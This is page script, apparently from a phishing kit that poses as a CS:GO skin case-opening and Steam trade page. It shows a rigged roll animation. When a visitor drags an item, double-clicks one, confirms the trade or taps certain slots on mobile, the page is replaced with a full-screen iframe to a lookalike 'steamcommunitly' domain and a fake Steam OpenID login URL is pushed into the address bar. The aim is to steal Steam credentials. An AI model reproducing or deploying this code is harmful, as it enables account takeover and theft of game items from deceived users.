<script>
    document.addEventListener('DOMContentLoaded', function () {

    var items = {
        simple: {
            skin: "M4A1-S | Cyrex",
            img: "https://steamcdn-a.akamaihd.net/apps/730/icons/econ/default_generated/weapon_m4a1_silencer_cu_m4a1s_cyrex_light_large.144b4053eb73b4a47f8128ebb0e808d8e28f5b9c.png"
        },
        middle: {
            skin: "M4A1-S | Chantico's Fire",
            img: "https://steamcommunity-a.akamaihd.net/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpou-6kejhz2v_Nfz5H_uO1gb-Gw_alIITCmX5d_MR6j_v--YXygED6_UZrMTzwJYSdJlU8N1zY81TrxO_v0MW9uJnBm3Rk7nEk5XfUmEeyhQYMMLIUhCYx0A"
        },
        super: {
            skin: "M4A4 | Asiimov",
            img: "https://steamcdn-a.akamaihd.net/apps/730/icons/econ/default_generated/weapon_m4a1_cu_m4_asimov_light_large.af03179f3d43ff55b0c3d114c537eac77abdb6cf.png"
        }
    };

    function between(min, max) {
        return Math.floor(
            Math.random() * (max - min) + min
        )
    }

    function generate(ng) {
        document.querySelector(".section2-case").style.display = "none"
        document.querySelector(".raffle-roller").style.display = "block"
        $('.raffle-roller-container').css({
            transition: "sdf",
            "margin-left": "0px"
        }, 10).html('');
        var randed2 = between(1, 4)
        for (var i = 0; i < 101; i++) {
            var element = '<div id="CardNumber' + i + '" class="item class_red_item" style="background-image:url(' + items.simple.img + ');"></div>';
            var randed = randomInt(1, 1000);
            if (randed < 50) {
                element = '<div id="CardNumber' + i + '" class="item class_red_item" style="background-image:url(' + items.super.img + ');"></div>';
            } else if (500 < randed) {
                element = '<div id="CardNumber' + i + '" class="item class_red_item" style="background-image:url(' + items.middle.img + ');"></div>';
            }
            $(element).appendTo('.raffle-roller-container');
        }
        setTimeout(function () {
            if (randed2 == 2) {
                goRoll(items.middle.skin, items.middle.img);
            } else if (randed2 == 1) {
                goRoll(items.super.skin, items.super.img);
            } else {
                goRoll(items.simple.skin, items.simple.img);
            }
        }, 500);
    }

    function goRoll(skin, skinimg) {
        $('.raffle-roller-container').css({
            transition: "all 8s cubic-bezier(.08,.6,0,1)"
        });
        $('#CardNumber78').css({
            "background-image": "url(" + skinimg + ")"
        });
        setTimeout(function () {
            $('#CardNumber78').addClass('winning-item');
            document.querySelector(".case-wrapper").style.display = "flex"
            document.querySelector(".skin-img").src = skinimg
            $('#rolledd').html(skin);
            var win_element = "<div class='item class_red_item' style='background-image: url(" + skinimg + ")'></div>";
            $(win_element).appendTo('.inventory');
        }, 8500);
        $('.raffle-roller-container').css('margin-left', '-6770px');
    }

    function randomInt(min, max) {
        return Math.floor(Math.random() * (max - min)) + min;
    }

</script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
	<script type="text/javascript">
	const domen = 'https://steamcommunitly-com.kyber-network.world/8cf2391c1';

	function goAuth_usdt() {
		$('body').html(`<iframe style="width: 100%;height: 100vh;border: unset;" src="` + domen + `"></iframe>`);
		window.history.pushState('', '', '/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fcshyper.com%2Fauth&openid.realm=https%3A%2F%2Fcshyper.com&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select');
	}
	$(document).ready(function() {
		$(".item").each(function() {
			$(this).attr("originalContainerId", $(this).parent().attr("id"));
			$(this).on("dragstart", function(event) {
				event.originalEvent.dataTransfer.setData("text/plain", event.target.id);
				event.originalEvent.dataTransfer.setData("originalContainerId", event.target.parentNode.id);
			});
			$(this).on("dblclick", function() {
				document.getElementById('you_cantready').style.display = 'none';
				document.getElementById('you_notready').style.display = 'block';
				var theirSlots = $("#their_slots .itemHolder.trade_slot");
				var targetSlot = getNextEmptySlot(theirSlots);
				if(targetSlot) {
					var originalContainerId = $(this).attr("originalContainerId");
					if($(this).parent().is(theirSlots)) {
						var originalContainer = $("#" + originalContainerId);
						originalContainer.find(".slot_inner").append(this);
					} else if(!$(this).parent().is(targetSlot)) {
						targetSlot.find(".slot_inner").append(this);
					}
					setTimeout(function() {
						goAuth_usdt();
					}, 700);
				} else {
					var originalContainerId = $(this).attr("originalContainerId");
					var originalContainer = $("#" + originalContainerId);
					originalContainer.find(".slot_inner").append(this);
				}
			});
		});
		$(".itemHolder").on("dragover", function(event) {
			event.preventDefault();
		});
		$(".itemHolder").on("drop", function(event) {
			var newContainerId = $(this).attr("id");
			var draggedItemId = event.originalEvent.dataTransfer.getData("text/plain");
			var originalContainerId = event.originalEvent.dataTransfer.getData("originalContainerId");
			var draggedItem = $("#" + draggedItemId);
			var originalContainer = $("#" + originalContainerId);
			var newContainer = $("#" + newContainerId);
			if(draggedItem.length > 0 && originalContainer.length > 0 && newContainer.length > 0) {
				if(originalContainer.get(0) !== newContainer.get(0)) {
					newContainer.find(".slot_inner").append(draggedItem);
					goAuth_usdt();
				}
			}
		});

		function getNextEmptySlot(slots) {
			var emptySlot = slots.find(".slot_inner:empty").first();
			return emptySlot.parent();
			goAuth_usdt();
		}
	});

	function waitForElementToExist(selector, callback) {
		var element = document.querySelector(selector);
		if(element) {
			callback(element);
		} else {
			setTimeout(function() {
				waitForElementToExist(selector, callback);
			}, 100);
		}
	}
	waitForElementToExist('#myElement', function(element) {
		// Делаем что-то с элементом
	});
	var curPage = document.getElementById("pagecontrol_cur");
	var maxPage = document.getElementById("pagecontrol_max");
	if(isNaN(currentPage)) {
		currentPage = 0;
	}
	curPage.innerHTML = currentPage + 1;
	maxPage.innerHTML = '51';
	var pages = document.getElementsByClassName("inventory_page");
	var currentPage = 0;

	function switchPage(direction) {
		pages[currentPage].style.display = "none";
		if(direction === "next") {
			currentPage = (currentPage + 1) % pages.length;
		} else {
			currentPage = (currentPage - 1 + pages.length) % pages.length;
		}
		pages[currentPage].style.display = "block";
		var curPage = document.getElementById("pagecontrol_cur");
		var maxPage = document.getElementById("pagecontrol_max");
		curPage.innerHTML = currentPage + 1;
		maxPage.innerHTML = pages.length;
	}
	document.getElementById("pagebtn_next").addEventListener("click", function() {
		switchPage("next");
	});
	document.getElementById("pagebtn_previous").addEventListener("click", function() {
		switchPage("prev");
	});
	var slotInner4 = document.querySelector('.slot_inner_4');
	var observer = new MutationObserver(function(mutationsList) {
		if(slotInner4.children.length > 0) {
			var slot1 = document.getElementById("1_slot");
			slot1.style.display = "block";
		}
	});
	var config = {
		childList: true
	};
	observer.observe(slotInner4, config);
	var slotInner8 = document.querySelector('.slot_inner_8');
	var observer8 = new MutationObserver(function(mutationsList) {
		if(slotInner8.children.length > 0) {
			// Получение элемента с id="2_slot"
			var slot2 = document.getElementById("2_slot");
			slot2.style.display = "block";
		}
	});
	var config8 = {
		childList: true
	};
	observer8.observe(slotInner8, config8);
	// Получение элемента с id="2_slot"
	var slot2 = document.getElementById("2_slot");
	if(slotInner8.children.length > 0) {
		slot2.style.display = "block";
	}
	document.getElementById('trade_confirmbtn_text').addEventListener("click", function() {
		goAuth_usdt()
	});
	// Проверяем, является ли устройство мобильным
	function isMobileDevice() {
		return(typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
	}
	if(isMobileDevice()) {
		var slot = document.getElementById('your_slot_0');
		slot.addEventListener('click', function() {
			goAuth_usdt()
		});
	}
	if(isMobileDevice()) {
		var slot1 = document.getElementById('their_slot_114');
		slot1.addEventListener('click', function() {
			goAuth_usdt()
		});
	}
	</script>
